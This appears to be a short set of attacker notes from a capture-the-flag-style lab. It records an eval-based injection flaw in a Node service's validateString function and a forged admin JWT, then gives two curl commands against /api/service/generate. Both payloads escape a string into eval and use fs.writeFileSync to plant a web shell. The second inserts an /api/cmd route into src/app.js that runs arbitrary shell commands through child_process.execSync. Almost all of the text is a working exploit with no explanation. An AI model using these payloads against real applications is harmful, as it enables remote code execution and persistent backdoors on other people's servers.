service-controllers.js => validateString uses eval


eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InRlc3RAaGFja3RoZWJveC5jb20iLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3Njg0MzQ1NzAsImV4cCI6MTc2ODUyMDk3MH0.SqSz7e1wTAbFDrTYxkB380PuDWnY-Tgd_MjjOf9YVtc    JWT SERVER

curl -s -X POST \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InRlc3RAaGFja3RoZWJveC5jb20iLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3Njg0MzQ1NzAsImV4cCI6MTc2ODUyMDk3MH0.SqSz7e1wTAbFDrTYxkB380PuDWnY-Tgd_MjjOf9YVtc" \
  -d '{"text":"'\'',statusCode:403})+require('\''fs'\'').writeFileSync('\''Hackers.txt'\'',`app.get(\"/api/cmd\", (req, res) => {\n  const cmd = require(\"child_process\").execSync(req.query.cmd).toString();\n  res.send(cmd);\n});`)//"}' \
  http://localhost:5000/api/service/generate


curl -s -X POST \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InRlc3RAaGFja3RoZWJveC5jb20iLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3Njg0MzQ1NzAsImV4cCI6MTc2ODUyMDk3MH0.SqSz7e1wTAbFDrTYxkB380PuDWnY-Tgd_MjjOf9YVtc " \
  -d "{\"text\":\"',statusCode:403})+require('fs').writeFileSync('src/app.js',require('fs').readFileSync('src/app.js','utf8').replace('// handle 404 errors','app.get(\\\"/api/cmd\\\",(req,res)=>res.send(require(\\\"child_process\\\").execSync(req.query.cmd).toString()));\\n// handle 404 errors'))//\"}" \
  http://localhost:5000/api/service/generate

